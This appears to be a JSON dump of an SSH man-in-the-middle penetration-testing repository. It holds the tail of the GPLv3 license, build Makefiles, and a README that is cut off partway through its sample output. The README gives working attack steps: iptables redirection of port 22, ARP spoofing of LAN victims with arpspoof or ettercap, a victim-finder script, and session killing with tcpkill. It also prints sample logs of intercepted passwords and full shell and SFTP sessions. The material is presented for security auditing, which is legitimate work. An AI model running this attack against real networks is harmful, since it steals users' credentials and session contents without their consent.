work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    <one line to give the program's name and a brief idea of what it does.>\n    Copyright (C) <year>  <name of author>\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    <program>  Copyright (C) <year>  <name of author>\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<https://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<https://www.gnu.org/licenses/why-not-lgpl.html>.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 0.177734375,
          "content": "all:\n\t./install.sh\n\nclean:\n\ttest -f openssh-7.5p1-mitm/Makefile && $(MAKE) -C openssh-7.5p1-mitm clean || echo \"OpenSSH directory is already clean.\"\n\t$(MAKE) -C openssl-1.0.2u clean\n"
        },
        {
          "name": "Makefile.docker",
          "type": "blob",
          "size": 0.7158203125,
          "content": "VERSION = $(shell grep SSH_MITM_VERSION *.patch | grep -E -o \"\\\"(.*)\\\"\" | head -1 | tr -d \"\\\"\")\nifeq ($(VERSION),)\n  $(error \"could not determine version!\")\nendif\n\nFORWARDING_ENABLED = $(shell sysctl net.ipv4.ip_forward | grep -E -o \"net.ipv4.ip_forward = 1\")\nifeq ($(FORWARDING_ENABLED),)\n  $(warning \"IP forwarding is not enabled.  Building the image may fail.  Fix with: sysctl net.ipv4.ip_forward=1\")\nendif\n\nall:\n\t@echo \"\\nBuilding Docker image for SSH-MITM ${VERSION}\\n\"\n\tdocker build -t positronsecurity/ssh-mitm:${VERSION} .\n\tdocker tag positronsecurity/ssh-mitm:${VERSION} positronsecurity/ssh-mitm:latest\n\nupload:\n\tdocker login\n\tdocker push positronsecurity/ssh-mitm:${VERSION}\n\tdocker push positronsecurity/ssh-mitm:latest\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 9.3857421875,
          "content": "# SSH MITM v2.3-dev\n\nAuthor: [Joe Testa](https://www.positronsecurity.com/company/) ([@therealjoetesta](https://twitter.com/therealjoetesta))\n\n\n## Overview\n\nThis penetration testing tool allows an auditor to intercept SSH connections.  A patch applied to the OpenSSH v7.5p1 source code causes it to act as a proxy between the victim and their intended SSH server; all plaintext passwords and sessions are logged to disk.\n\nOf course, the victim's SSH client will complain that the server's key has changed.  But because 99.99999% of the time this is caused by a legitimate action (OS re-install, configuration change, etc), many/most users will disregard the warning and continue on.\n\n**NOTE:** Only run the modified *sshd_mitm* in a VM or container!  Ad-hoc edits were made to the OpenSSH sources in critical regions, with no regard to their security implications.  Its not hard to imagine these edits introduce serious vulnerabilities.\n\n\n## Change Log\n\n* v2.3: ???: Added support for Linux Mint 20 & Ubuntu 20.\n* v2.2: September 16, 2019: Fixed installation on Kali & Linux Mint 19.  Fixed a double-password prompt that occured under certain conditions.  Improved error logging.\n* v2.1: January 4, 2018: Enabled non-interactive command execution, connections to old servers with weak algorithms can now be intercepted, fixed two major bugs which caused AppArmor to kill some connections, and improved error logging.\n* v2.0: September 12, 2017: Added full SFTP support(!) and AppArmor confinement.\n* v1.1: July 6, 2017: Removed root privilege dependencies, added automatic installer, added Kali Linux support, added *JoesAwesomeSSHMITMVictimFinder.py* script to find potential targets on a LAN.\n* v1.0: May 16, 2017: Initial revision.\n\n\n## Running The Docker Image\n\nThe quickest & easiest way to get started is to use the Docker image with SSH MITM pre-built.\n\n1.) Obtain the image from Dockerhub with:\n\n    $ docker pull positronsecurity/ssh-mitm\n\n2.) Next, run the container with:\n\n    $ mkdir -p ${PWD}/ssh_mitm_logs && docker run --network=host -it --rm -v ${PWD}/ssh_mitm_logs:/home/ssh-mitm/log positronsecurity/ssh-mitm\n\n3.) Enable IP forwarding and NATing routes on your host machine:\n\n    # echo 1 > /proc/sys/net/ipv4/ip_forward\n    # iptables -P FORWARD ACCEPT\n    # iptables -A INPUT -p tcp --dport 2222 -j ACCEPT\n    # iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\n\n4.) Find targets on the LAN, and ARP spoof them (see below).\n\n5.) Shell and SFTP sessions will be logged in the `ssh_mitm_logs` directory.\n\n\n## Initial Setup\n\nAs root, run the *install.sh* script.  This will install prerequisites from the repositories, download the OpenSSH archive, verify its signature, compile it, and initialize a non-privileged environment to execute within.\n\n\n## Finding Targets\n\nThe *JoesAwesomeSSHMITMVictimFinder.py* script makes finding targets on a LAN very easy.  It will ARP spoof a block of IPs and sniff for SSH traffic for a short period of time before moving on to the next block.  Any ongoing SSH connections originating from devices on the LAN are reported.\n\nBy default, *JoesAwesomeSSHMITMVictimFinder.py* will ARP spoof and sniff only 5 IPs at a time for 20 seconds before moving onto the next block of 5.  These parameters can be tuned, though a trade-off exists: the more IPs that are spoofed at a time, the greater the chance you will catch an ongoing SSH connection, but also the greater the strain you will put on your puny network interface.  Under too high of a load, your interface will start dropping frames, causing a denial-of-service and greatly raising suspicions (this is bad).  The defaults shouldn't cause problems in most cases, though it'll take longer to find targets.  The block size can be safely raised on low-utilization networks.\n\nExample:\n\n    # ./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s3 --ignore-ips 10.11.12.50,10.11.12.53\n    Found local address 10.11.12.141 and adding to ignore list.\n    Using network CIDR 10.11.12.141/24.\n    Found default gateway: 10.11.12.1\n    IP blocks of size 5 will be spoofed for 20 seconds each.\n    The following IPs will be skipped: 10.11.12.50 10.11.12.53 10.11.12.141\n\n\n    Local clients:\n      * 10.11.12.70 -> 174.129.77.155:22\n      * 10.11.12.43 -> 10.11.99.2:22\n\nThe above output shows that two devices on the LAN have created SSH connections (10.11.12.43 and 10.11.12.70); these can be targeted for a man-in-the-middle attack.  Note, however, that in order to potentially intercept credentials, you'll have to wait for them to initiate new connections.  Impatient pentesters may opt to forcefully close existing SSH sessions (using the *tcpkill* tool), prompting clients to create new ones immediately...\n\n\n## Running The Attack\n\n1.) Once you've completed the initial setup and found a list of potential victims (see above), execute *start.sh* as root.  This will start *sshd_mitm*, enable IP forwarding, and set up SSH packet interception through *iptables*.\n\n2.) ARP spoof the target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):\n\n    arpspoof -r -t 192.168.x.1 192.168.x.5\n\nAlternatively, you can use the *ettercap* tool:\n\n    ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//\n\n3.) Monitor *auth.log*.  Intercepted passwords will appear here:\n\n    sudo tail -f /var/log/auth.log\n\n4.) Once a session is established, a full log of all input & output can be found in */home/ssh-mitm/*.  SSH sessions are logged as *shell_session_\\*.txt*, and SFTP sessions are logged as *sftp_session_\\*.html* (with transferred files stored in a corresponding directory).\n\n\n## Sample Results\n\nUpon success, */var/log/auth.log* will have lines that log the password, like this:\n\n    Sep 11 19:28:14 showmeyourmoves sshd_mitm[16798]: INTERCEPTED PASSWORD: hostname: [10.199.30.x]; username: [jdog]; password: [supercalifragilistic] [preauth]\n\nFurthermore, the victim's entire SSH session is logged:\n\n    # cat /home/ssh-mitm/shell_session_0.txt\n    Hostname: 10.199.30.x\n    Username: jdog\n    Password: supercalifragilistic\n    -------------------------\n    Last login: Thu Aug 31 17:42:38 2017\n    OpenBSD 6.1 (GENERIC.MP) #21: Wed Aug 30 08:21:38 CEST 2017\n\n    Welcome to OpenBSD: The proactively secure Unix-like operating system.\n\n    Please use the sendbug(1) utility to report bugs in the system.\n    Before reporting a bug, please try to reproduce it with the latest\n    version of the code.  With bug reports, please try to ensure that\n    enough information to reproduce the problem is enclosed, and if a\n    known fix for it exists, include that as well.\n\n    jdog@jefferson ~ $ ppss\n      PID TT  STAT       TIME COMMAND\n    59264 p0  Ss      0:00.02 -bash (bash)\n    52132 p0  R+p     0:00.00 ps\n    jdog@jefferson ~ $ iidd\n    uid=1000(jdog) gid=1000(jdog) groups=1000(jdog), 0(wheel)\n    jdog@jefferson ~ $ sssshh  jjtteessttaa@@mmaaggiiccbbooxx\n    jtesta@magicbox's password: ROFLC0PTER!!1juan\n\n\nNote that the characters in the user's commands appear twice in the file because the input from the user is recorded, as well as the output from the shell (which echoes characters back).  Observe that when programs like *sudo* and *ssh* temporarily disable echoing in order to read a password, duplicate characters are not logged.\n\nAll SFTP activity is captured as well.  Use a browser to view *sftp_session_0.html*.  It contains a log of commands, with links to files uploaded and downloaded:\n\n    # cat /home/ssh-mitm/sftp_session_0.txt\n    <html><pre>Hostname: 10.199.30.x\n    Username: jdog\n    Password: supercalifragilistic\n    -------------------------\n    > realpath \".\" (Result: /home/jdog)\n    > realpath \"/home/jdog/.\" (Result: /home/jdog)\n    > ls /home/jdog\n    drwxr-xr-x    4 jdog     jdog         4096 Sep 11 16:12 .\n    drwxr-xr-x    4 root     root         4096 Sep  6 11:53 ..\n    -rw-r--r--    1 jdog     jdog         3771 Aug 31  2015 .bashrc\n    -rw-r--r--    1 jdog     jdog          220 Aug 31  2015 .bash_logout\n    drwx------    2 jdog     jdog         4096 Sep  6 11:54 .cache\n    -rw-r--r--    1 jdog     jdog          655 May 16 08:49 .profile\n    drwx------    2 jdog     jdog         4096 Sep  8 16:59 .ssh\n    -rw-rw-r--    1 jdog     jdog      5242880 Sep  8 15:52 file\n    -rw-rw-r--    1 jdog     jdog        43131 Sep 10 10:47 file2\n    -rw-rw-r--    1 jdog     jdog           83 Sep  6 12:56 file3\n    -rw-rw-r--    1 jdog     jdog      